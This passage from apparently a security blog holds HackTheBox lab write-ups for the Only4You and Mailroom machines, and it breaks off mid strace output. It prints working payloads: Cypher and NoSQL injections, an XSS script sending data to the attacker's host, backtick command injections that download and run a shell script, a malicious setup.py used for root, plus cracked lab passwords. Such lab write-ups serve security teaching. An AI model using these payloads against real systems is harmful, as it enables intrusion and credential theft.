name=robin\u0026amp;email=robin%40only4you%2Ehtb%3Bbash%20%2Ftmp%2Fshell%2Esh\u0026amp;subject=nothing\u0026amp;message=al Doing so, we got the connection on the listener:\nAfter doing initial enumeration, I noticed there were two users named john and dev and in the /opt folder, we see that there were two folders gogs and internal_app but we did not have permissions to check the folder, moving on, I saw that there were two ports in use 3000 and 8001\nbash-5.0$ netstat -ntpl netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 1034/nginx: worker tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 127.0.0.1:7687 :::* LISTEN - tcp6 0 0 127.0.0.1:7474 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - bash-5.0$ cd /tmp Since we do not have the SSH connection, I used the chisel to perform port forwarding:\nbash-5.0$ ./chisel client 10.10.14.22:9999 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000 \u0026lt;22:9999 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000 2023/04/23 07:40:38 client: Connecting to ws://10.10.14.22:9999 2023/04/23 07:40:39 client: Connected (Latency 112.100734ms) Checking the port 3000 , it was running gogs and we did not have any credentials to check here:\nMoving on to the port 8001 , it also had a login page:\nTrying with the following credentials resulted in the application access:\nadmin:admin The application had a task marked as completed that the transfer to neo4j database has been completed:\nWe also had a “Employee” page which allowed us to search for employees:\nGiving a single quote in the search box resulted in 500 error:\nGiven, we already know that the backend database is neo4j , just a note that it differs from the SQL queries, neo4j uses Cypher Queries and for the Cypher queries one thing to note down is that every query must return some sort of the value. To check and confirm the hypothesis of the injection, there is a procedure named as LOAD CSV FROM which can be used to load arbitrary values from a remote server over HTTP connection. Here, we just tried to check if it makes the connection to our remote HTTP server:\n\u0026#39; OR 1=1 LOAD CSV FROM \u0026#39;http://10.10.14.22\u0026#39; AS y RETURN \u0026#39;\u0026#39;// Injecting the above query and checking the HTTP Server, we see that there were some requests made to it from 10.10.11.210\n❯ sudo python3 -m http.server 80 --bind 10.10.14.22 Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ... 10.10.11.210 - - [23/Apr/2023 11:10:29] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 11:10:29] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 11:10:30] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 11:10:30] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Next thing to try here is to extract labels which is equivalent for SQL’s tables:\n\u0026#39; MATCH (n) WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM \u0026#39;http://10.10.14.22/\u0026#39;+d AS y RETURN y // And on our HTTP server, we see that a request to user endpoint was made which means there is a label called user\n10.10.11.210 - - [23/Apr/2023 11:22:03] \u0026#34;GET /user HTTP/1.1\u0026#34; 404 Now that we know the label , we can get the data from the label:\n\u0026#39; OR 1=1 WITH 1 as a MATCH (f:User) UNWIND keys(f) as p LOAD CSV FROM \u0026#39;http://10.10.14.22/?\u0026#39; + p +\u0026#39;=\u0026#39;+toString(f[p]) as l RETURN 0 as _0 // Injecting the payload resulted in several connections to our HTTP server revealing the hashes and usernames:\n❯ sudo python3 -m http.server 80 --bind 10.10.14.22 Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ... 10.10.11.210 - - [23/Apr/2023 16:28:44] \u0026#34;GET /shell.sh HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 16:33:04] code 404, message File not found 10.10.11.210 - - [23/Apr/2023 16:33:04] \u0026#34;GET /user HTTP/1.1\u0026#34; 404 - 10.10.11.210 - - [23/Apr/2023 16:54:50] code 404, message File not found 10.10.11.210 - - [23/Apr/2023 16:54:50] \u0026#34;GET /neo4j HTTP/1.1\u0026#34; 404 - 10.10.11.210 - - [23/Apr/2023 16:56:57] code 400, message Bad request syntax (\u0026#39;GET /Neo4j Kernel HTTP/1.1\u0026#39;) 10.10.11.210 - - [23/Apr/2023 16:56:57] \u0026#34;GET /Neo4j Kernel HTTP/1.1\u0026#34; 400 - 10.10.11.210 - - [23/Apr/2023 17:06:45] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:45] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:45] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:45] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:46] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:47] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:48] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:48] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:48] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.10.11.210 - - [23/Apr/2023 17:06:48] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - Cracking the hashes on the crackstation, we see that there is a hash which equals to ThisIs4You and that has belonged to john user:\njohn:ThisIs4You Now, we can login to the SSH via the obtained credentials:\nOnce logged in and checking if there is any command that could be ran by john user:\njohn@only4you:~$ sudo -l Matching Defaults entries for john on only4you: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on only4you: (root) NOPASSWD: /usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz Now, searching for any privilege escalation online for the pip download, I stumbled on the following post:\nhttps://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/\nFollowing the post, I just changed the [setup.py](http://setup.py) and used os.system to execute the same shell script that I had downloaded previously to the machine:\nfrom setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info import os def RunCommand(): print(\u0026#34;Hello, p0wnd!\u0026#34;) os.system(\u0026#34;bash /tmp/shell.sh\u0026#34;) class RunEggInfoCommand(egg_info): def run(self): RunCommand() egg_info.run(self) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name = \u0026#34;this_is_fine_wuzzi\u0026#34;, version = \u0026#34;0.0.1\u0026#34;, license = \u0026#34;MIT\u0026#34;, packages=find_packages(), cmdclass={ \u0026#39;install\u0026#39; : RunInstallCommand, \u0026#39;egg_info\u0026#39;: RunEggInfoCommand }, ) Now, we can just upload the tar.gz file to a repository ongogs using john credentials and then execute the command:\nNote that in order to run the sudo pip download , it only accepted a tar.gz file downloaded from the port 3000 of the localhost, so we needed to upload the tar.gz file to the gogs john@only4you:/var/tmp/tested_repo$ cp ../this_is_fine_wuzzi-0.0.1.tar.gz xploited.tar.gz john@only4you:/var/tmp/tested_repo$ git add . john@only4you:/var/tmp/tested_repo$ git commit -m \u0026#34;exp\u0026#34; [master 675d20a] exp 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 xploited.tar.gz john@only4you:/var/tmp/tested_repo$ git push Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (3/3), done. Writing objects: 100% (3/3), 2.94 KiB | 2.94 MiB/s, done. Total 3 (delta 0), reused 0 (delta 0) Username for \u0026#39;http://127.0.0.1:3000\u0026#39;: john Password for \u0026#39;http://john@127.0.0.1:3000\u0026#39;: To http://127.0.0.1:3000/john/tested_repo.git 947c79a..675d20a master -\u0026gt; master I uploaded the tar.gz via git command as the web application for the gogs was too buggy over the tunneling, then executing the command, resulted in root :\n","date":"26 August 2023","permalink":"/posts/onlyforyou-htb/","section":"Posts","summary":"Writeup for HackTheBox\u0026rsquo;s Only4You machine.\nonly4you.htb seemed like a static site with the contact functionality where we had some input fields, directory busting did not reveal anything interestin:","title":"HackTheBox - Only4You"},{"content":"","date":null,"permalink":"/tags/python-flask-lfi-chisel-jtr-pip3/","section":"Tags","summary":"","title":"Python-Flask, LFI, Chisel, Jtr, Pip3"},{"content":"","date":null,"permalink":"/tags/blindsqlinjection-nosql-xss-pspy64/","section":"Tags","summary":"","title":"BlindSQLInjection, NoSQL, XSS, Pspy64"},{"content":"Writeup for HackTheBox\u0026rsquo;s Mailroom machine.\nStarting off with the nmap scan, we can see that port 80 and 22 is open:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 82:1b:eb:75:8b:96:30:cf:94:6e:79:57:d9:dd:ec:a7 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZd951iwnVNWvSYmYx8ZJUf9o5yhI3zVuVAfNLLrTdhwnstMMOWcnMDyPgwfnbzDJ89BnmvHuC5k9kVJjIQJpM= | 256 19:fb:45:fe:b9:e4:27:5d:e5:bb:f3:54:97:dd:68:cf (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImOwXljVycTwdL6fg/kkMWPDWdO+roydyEf8CeBYu7X 80/tcp open http syn-ack Apache httpd 2.4.54 ((Debian)) |_http-title: The Mail Room | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F |_http-server-header: Apache/2.4.54 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Performing a directory busting on the HTTP port, we see that it has multiple php files but none of them are of much interest beside contact.php\n❯ gobuster dir -u http://10.10.11.209/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.209/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/04/20 09:31:15 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 7748] /contact.php (Status: 200) [Size: 4317] /about.php (Status: 200) [Size: 6891] /services.php (Status: 200) [Size: 4336] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.209/assets/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.209/css/] /template (Status: 403) [Size: 277] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.209/js/] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.11.209/javascript/] /font (Status: 301) [Size: 311] [--\u0026gt; http://10.10.11.209/font/] /server-status (Status: 403) [Size: 277] =============================================================== 2023/04/20 10:27:58 Finished =============================================================== The contact page accepts the a feedback message, we can try to include a XSS payload and see if it hit back to our HTTP Server:\nWe got a hit on the HTTP Server:\nAlthough nothing more could be done, as there was no login page or admin panel hence there is no need to manage sessions of an user due to which we cannot try to steal cookies either. Furthermore, performing a vhost scan, I identified that git.mailroom.htb exists, adding it to the hosts file and visiting it, we see that there is a repository named staffroom for a user named matthew , since the repository is public, we can have a look into the code:\nNoticing that there is another application running on staff-review-panel.mailroom.htb/ , accessing it directly from the browser or from my machine resulted in 403 Access Denied which probably means there’s some kind of filtering.\nRecalling that we had XSS through which we can trick the AI bot into visiting the provided link, what we can do with this, let the AI bot visit the staff-review-panel.mailroom.htb/ and send it’s contents to our listener, this could be done with following XSS payload:\nNow, sending the payload, we see that there is a response and it is able to access the staff-review-panel.mailroom.htb successfully\nNow, since we have access to the codebase of the staff-review-panel.mailroom.htb , we see that there is auth.php and it is authenticating user via mongodb\nThe way the authentication works is, first the user provides email and password which is then checked from the collections, if it is correct a 2FA email is sent to the user which contains the link that can be used to authenticate to the application:\nThere is a possibility of NoSQL injection, we can check it by sending the following payload:\n\u0026lt;script\u0026gt; var mail1req = new XMLHttpRequest(); mail1req.onreadystatechange = function() {{ if (mail1req.readyState == 4) {{ var exfilreq = new XMLHttpRequest(); exfilreq.open(\u0026#34;POST\u0026#34;, \u0026#34;http://10.10.14.22/\u0026#34;, false); exfilreq.send(mail1req.response); }} }}; mail1req.open(\u0026#39;POST\u0026#39;, \u0026#39;http://staff-review-panel.mailroom.htb/auth.php\u0026#39;, false); mail1req.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); var params = \u0026#34;email[$ne]=1\u0026amp;password[$ne]=1\u0026#34;; mail1req.send(params); \u0026lt;/script\u0026gt; This returned a successful response exactly but it sends a 2FA token.\nSince we do not have any way of reading mail, we can use this NoSQL injection to dump the credentials, Nikhil made the following payload script which was used to dump the email and password :\nimport socket import http.server import socketserver import threading import requests result = \u0026#34;\u0026#34; final_payload = \u0026#34;\u0026#34; class MyRequestHandler(http.server.SimpleHTTPRequestHandler): def do_POST(self): global result content_length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) body = self.rfile.read(content_length) if \u0026#34;Check your inbox for an email with your 2FA token\u0026#34; in str(body): result = True self.send_response(200) self.end_headers() event.set() def start_server(): with socketserver.TCPServer((\u0026#34;\u0026#34;, 80), MyRequestHandler) as httpd: print(\u0026#34;Server listening on port 80...\u0026#34;) httpd.serve_forever() def send_request(payload): url = \u0026#34;http://10.10.11.209:80/contact.php\u0026#34; headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;} xss_payload = f\u0026#34;\u0026#34;\u0026#34; \u0026lt;script\u0026gt; var mail1req = new XMLHttpRequest(); mail1req.onreadystatechange = function() {{ if (mail1req.readyState == 4) {{ var exfilreq = new XMLHttpRequest(); exfilreq.open(\u0026#34;POST\u0026#34;, \u0026#34;http://10.10.14.62/\u0026#34;, false); exfilreq.send(mail1req.response); }} }}; mail1req.open(\u0026#39;POST\u0026#39;, \u0026#39;http://staff-review-panel.mailroom.htb/auth.php\u0026#39;, false); mail1req.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); # var params = \u0026#34;email[$regex]=^{payload}\u0026amp;password[$ne]=fakepass\u0026#34;; var params = \u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=^{payload}\u0026#34;; mail1req.send(params); \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; data = { \u0026#34;email\u0026#34;: \u0026#34;pwn@hack.com\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Pwn\u0026#34;, \u0026#34;message\u0026#34;: xss_payload } requests.post(url, headers=headers, data=data) # start the server in a separate thread event = threading.Event() server_thread = threading.Thread(target=start_server) server_thread.start() # send requests and wait for server to print the body before proceeding with the next request special_chars = [\u0026#39;\\\\\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;^\u0026#39;] i = 33 while i \u0026lt; 126: char = chr(i) if char in special_chars: char = \u0026#39;\\\\\\\\\u0026#39; + char print(f\u0026#34;Trying: {final_payload}\u0026#34; + chr(i)) send_request(final_payload + char) if event.wait(timeout=60): event.clear() # reset the event for the next iteration if result: print(f\u0026#34;Found: {chr(i)}\u0026#34;) final_payload += chr(i) i = 32 result = False else: print(\u0026#34;Timeout waiting for server response\u0026#34;) pass if i \u0026lt; 126: i += 1 Running it, we successfully were able to get the password and email, although it did break in-between a lot due to free tier network and the script was modified altogether in accordance to the pattern found:\ntristan:69trisRulez! Now, we retrieved the credentials, trying to SSH into the machine as the user tristan\nAfter thorough enumeration, I did not find anything of concern beside the /var/mail/tristan which contained the 2FA code sent to it.\nAlthough one thing I noticed that there wasn’t any trace of applications running so far, to presume and checking the network interfaces, I came to the conclusion it might be running inside the docker. Going back to the staff-review-panel.mailroom.htb , since we have the credentials and we have 2FA token access. Now, we can do dynamic port forwarding to access the http://staff-review-panel.mailroom.htb/ directly, now all we have to do is use the proxy and we are able to access it successfully:\nAuthenticating as the tristan user, a 2FA code was sent to him, which we can get from /var/mail/tristan\ntristan@mailroom:~$ cat /var/mail/tristan Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=ce9db17d910d46a089ebe2cd73915cd8 From noreply@mailroom.htb Sat Apr 22 09:39:14 2023 Return-Path: \u0026lt;noreply@mailroom.htb\u0026gt; X-Original-To: tristan@mailroom.htb Delivered-To: tristan@mailroom.htb Received: from localhost (unknown [172.19.0.5]) by mailroom.localdomain (Postfix) with SMTP id C26B4D4E for \u0026lt;tristan@mailroom.htb\u0026gt;; Sat, 22 Apr 2023 09:39:14 +0000 (UTC) Subject: 2FA Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=9bb740bafb69c15d88cdc7a090d65181 Visiting the link we got with the 2FA, we can successfully access the application now:\nRecalling the git.mailroom.htb , we saw that there was a inspect.php and it had shell_exec function call which takes either inquiry_id or status_id and it filters out some characters to mitigate the possibility of command injection via preg_replace but it misses the backtick character\nWe can test it by capturing the request in burp suite and making a nc connection, to point it out, the staff-review-panel.mailroom.htb is running inside the docker and it was unable to make connection to my kali machine, so I used the SSH connection to connect to the mailroom.htb machine and used it for gaining reverse shell and testing connection:\nPOST /inspect.php HTTP/1.1 Host: staff-review-panel.mailroom.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 47 Origin: http://staff-review-panel.mailroom.htb Connection: close Referer: http://staff-review-panel.mailroom.htb/inspect.php Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58 Upgrade-Insecure-Requests: 1 inquiry_id=%60nc%2010%2E10%2E11%2E209%204444%60 It wasn’t connecting back to my kali machine but successfully making connection the mailroom machine itself, could be because of docker instance running on the machine it is unable to make any outbound connection beside the host machine itself\ntristan@mailroom:~$ nc -nlvp 4444 Listening on 0.0.0.0 4444 Connection received on 172.19.0.5 52694 Now, since there are many filtered characters, what I did was downloading the bash script containing the reverse shell payload to the staff-review-panel.mailroom.htb docker\n`; curl http://10.10.11.209:4444/shell.sh -o /tmp/shell.sh` POST /inspect.php HTTP/1.1 Host: staff-review-panel.mailroom.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 109 Origin: http://staff-review-panel.mailroom.htb Connection: close Referer: http://staff-review-panel.mailroom.htb/inspect.php Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58 Upgrade-Insecure-Requests: 1 status_id=%60%3B%20curl%20http%3A%2F%2F10%2E10%2E11%2E209%3A4444%2Fshell%2Esh%20%2Do%20%2Ftmp%2Fshell%2Esh%60 It downloaded the shel;l.sh script from the HTTP Server\nNow, we just execute the bash script:\nPOST /inspect.php HTTP/1.1 Host: staff-review-panel.mailroom.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 48 Origin: http://staff-review-panel.mailroom.htb Connection: close Referer: http://staff-review-panel.mailroom.htb/inspect.php Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58 Upgrade-Insecure-Requests: 1 status_id=%60%3B%20bash%20%2Ftmp%2Fshell%2Esh%60 Doing so, we got the reverse shell on the staff-review-panel.mailroom.htb\nChecking the docker filesystem, nothing much was found though the /var/www/staffroom had .git folder which had config file containing the credentials for the matthew user:\n[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main [user] email = matthew@mailroom.htb I tried to SSH as matthew but it resulted in failure, so from the tristan session, we can just do su to change to matthew\nAfter further enumeration, what I identified was there was Personal.kdbx file but we did not have master key to access the database and performing the normal enumeration did not point to any potential location containing the key, running pspy did reveal that there was a command being executed every often and the process is being executed by matthew user itself:\nTo check what the process was doing or what argument is passed to it, since we have matthew user privileges and the automated process is also ran under matthew , we can attach to the process and check the syscalls or inputs passed to it. To do so, we can make use of strace and use -p to specify the PID\nstrace -p \u0026lt;PID\u0026gt; Using the strace to attach to the automated process, I noticed following calls to read which was reading the master key password from the stdin\nfcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 brk(0x5596e3641000) = 0x5596e3641000 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;!\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;s\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, \u0026#34;*\u0026#34;, 1) = 1 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, 0x5596e361ea20, 8192) = -1 EAGAIN (Resource temporarily unavailable) fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0 fcntl(0, F_GETFL) = 0x2 (flags O_RDWR) fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0 read(0, \u0026#34;E\u0026#34;, 8192) = 1 fcntl(0, F_GETFL) = 0x802 (flags O_RDWR|O_NONBLOCK) fcntl(0, F_SETFL, O_RDWR) = 0 write(1, 